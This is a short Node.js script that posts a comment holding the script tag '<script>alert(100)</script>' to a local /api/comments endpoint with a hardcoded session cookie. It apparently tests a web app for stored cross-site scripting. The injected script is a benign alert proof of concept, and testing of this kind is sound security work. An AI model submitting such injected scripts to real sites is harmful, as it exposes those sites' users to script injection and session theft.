let comment = JSON.stringify({ content: '<script>alert(100)</script>' });
let options = {
    host: 'localhost',
    port: 3000,
    path: '/api/comments',
    method: 'POST',
    headers: {
        "Cookie": "sessionId=session-1528515796661198.3980783875001",
        "Content-Type": "application/json"
    }
}
let http = require('http');
let req = http.request(options, function (res) {
    res.on('data', function (data) {
        console.log(data.toString());
    });
});
req.write(comment);
req.end();
